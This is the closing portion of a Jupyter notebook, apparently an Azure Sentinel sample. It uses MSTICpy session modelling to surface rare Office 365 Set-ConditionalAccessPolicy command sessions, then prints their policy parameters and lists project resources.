     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Param session details:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Megan MFA demo',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\235bec94-f744-48ac-8314-5675953d2def',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Disabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"All\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"eababd92-9dc7-40e3-9359-6c106522db19\"]}]},\"DevicePlatforms\":{\"Include\":[{\"DevicePlatforms\":[\"All\"]}],\"Exclude\":[{\"DevicePlatforms\":[\"macOS\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\"]}],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'MeganB MCAS Step-up',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Enabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Acrs\":[\"urn:microsoft:req1\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"eababd92-9dc7-40e3-9359-6c106522db19\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\"]}],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Test Policy',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Enabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"00000003-0000-0ff1-ce00-000000000000\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"All\"]}]}},\"SessionControls\":[\"CloudAppSecurity\"],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false,\"CasSessionControlType\":1}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Yanivsh -CA Test',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04',\n",
       " 'PolicyDetails': '{\"Version\":0,\"CreatedDateTime\":\"2020-05-19T13:34:15.2394934Z\",\"ModifiedDateTime\":\"2020-05-19T13:39:04.7333386Z\",\"State\":\"Reporting\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"None\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"Guests\"]}]},\"DevicePlatforms\":{\"Include\":[{\"DevicePlatforms\":[\"All\"]}],\"Exclude\":[{\"DevicePlatforms\":[\"Android\",\"iOS\",\"macOS\"]}]},\"ClientTypes\":{\"Include\":[{\"ClientTypes\":[\"Browser\",\"Native\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\",\"RequireCompliantDevice\"]}]}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:12 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'MeganB MCAS Step-up',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Enabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Acrs\":[\"urn:microsoft:req1\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"eababd92-9dc7-40e3-9359-6c106522db19\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\"]}],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Megan MFA demo',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\235bec94-f744-48ac-8314-5675953d2def',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Disabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"All\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"eababd92-9dc7-40e3-9359-6c106522db19\"]}]},\"DevicePlatforms\":{\"Include\":[{\"DevicePlatforms\":[\"All\"]}],\"Exclude\":[{\"DevicePlatforms\":[\"macOS\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\"]}],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Test Policy',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d',\n",
       " 'PolicyDetails': '{\"Version\":0,\"State\":\"Enabled\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"00000003-0000-0ff1-ce00-000000000000\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"All\"]}]}},\"SessionControls\":[\"CloudAppSecurity\"],\"PersistentBrowserSessionMode\":\"NotSet\",\"EnforceAllPoliciesForEas\":false,\"IncludeOtherLegacyClientTypeForEvaluation\":false,\"CasSessionControlType\":1}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Yanivsh -CA Test',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04',\n",
       " 'PolicyDetails': '{\"Version\":0,\"CreatedDateTime\":\"2020-05-19T13:34:15.2394934Z\",\"ModifiedDateTime\":\"2020-05-19T13:39:04.7333386Z\",\"State\":\"Reporting\",\"Conditions\":{\"Applications\":{\"Include\":[{\"Applications\":[\"None\"]}]},\"Users\":{\"Include\":[{\"Users\":[\"Guests\"]}]},\"DevicePlatforms\":{\"Include\":[{\"DevicePlatforms\":[\"All\"]}],\"Exclude\":[{\"DevicePlatforms\":[\"Android\",\"iOS\",\"macOS\"]}]},\"ClientTypes\":{\"Include\":[{\"ClientTypes\":[\"Browser\",\"Native\"]}]}},\"Controls\":[{\"Control\":[\"Mfa\",\"RequireCompliantDevice\"]}]}',\n",
       " 'PolicyIdentifierString': '',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:12 AM',\n",
       " 'TenantDefaultPolicy': ''}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Default Policy',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7',\n",
       " 'PolicyDetails': '{\"Version\":0,\"LastUpdatedTimestamp\":\"2020-06-11T12:45:19.4695224Z\",\"State\":\"Disabled\",\"SignInFrequency\":\"NotSet\",\"PersistentBrowserSessionMode\":\"NotSet\"}',\n",
       " 'PolicyIdentifierString': '5/19/2020 1:39:05 PM',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM',\n",
       " 'TenantDefaultPolicy': '18'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Set-ConditionalAccessPolicy</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'DisplayName': 'Default Policy',\n",
       " 'Identity': 'seccxpninja.onmicrosoft.com\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7',\n",
       " 'PolicyDetails': '{\"Version\":0,\"LastUpdatedTimestamp\":\"2020-06-11T12:45:19.4695224Z\",\"State\":\"Disabled\",\"SignInFrequency\":\"NotSet\",\"PersistentBrowserSessionMode\":\"NotSet\"}',\n",
       " 'PolicyIdentifierString': '5/19/2020 1:39:05 PM',\n",
       " 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM',\n",
       " 'TenantDefaultPolicy': '18'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><hr><br></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import pprint\n",
    "\n",
    "rarest_events = (\n",
    "    modelled_df[modelled_df[\"rarest_window3_likelihood\"] < threshold.value]\n",
    "    [[\n",
    "        \"UserId\", \"ClientIP\", \"begin\", \"end\", \"param_value_session\", \"rarest_window3_likelihood\"\n",
    "    ]]\n",
    "    .rename(columns={\"rarest_window3_likelihood\": \"likelihood\"})\n",
    "    .sort_values(\"likelihood\")\n",
    ")\n",
    "for idx, (_, rarest_event) in enumerate(rarest_events.iterrows(), 1):\n",
    "    md(f\"Event {idx}\", \"large\")\n",
    "    display(pd.DataFrame(rarest_event[[\"UserId\", \"ClientIP\", \"begin\", \"end\", \"likelihood\"]]))\n",
    "\n",
    "    md(\"<hr>\")\n",
    "    md(\"Param session details:\", \"bold\")\n",
    "    for cmd in rarest_event.param_value_session:\n",
    "        md(f\"Command: {cmd.name}\")\n",
    "        md(pprint.pformat(cmd.params))\n",
    "    md(\"<hr><br>\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<hr>\n",
    "\n",
    "# Resources\n",
    "## MSTICpy:\n",
    "- msticpy Github https://github.com/Microsoft/msticpy\n",
    "- msticpy Docs https://msticpy.readthedocs.io/en/latest/\n",
    "- msticpy Release Blog https://medium.com/@msticmed\n",
    "\n",
    "### MSTICpy maintainers:\n",
    "- Ian Hellen [@ianhellen](https://twitter.com/ianhellen)\n",
    "- Pete Bryan [@MSSPete](https://twitter.com/MSSPete)\n",
    "- Ashwin Patil [@ashwinpatil](https://twitter.com/ashwinpatil)\n",
    "\n",
    "## Azure Sentinel Notebooks:\n",
    "- Azure Sentinel Github Notebooks https://github.com/Azure/Azure-Sentinel-Notebooks/\n",
    "  - (Samples with data in Sample-Notebooks folder)\n",
    "- Azure Sentinel Tech Community Blogs https://aka.ms/AzureSentinelBlog"
   ]
  }
 ],
 "metadata": {
  "kernel_info": {
   "name": "python38-azureml"
  },
  "kernelspec": {
    "display_name": "Python 3.8 - AzureML",
    "language": "python",
    "name": "python38-azureml"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  },
  "microsoft": {
   "host": {
    "AzureML": {
     "notebookHasBeenCompleted": true
    }
   }
  },
  "nteract": {
   "version": "nteract-front-end@1.0.0"
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {},
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}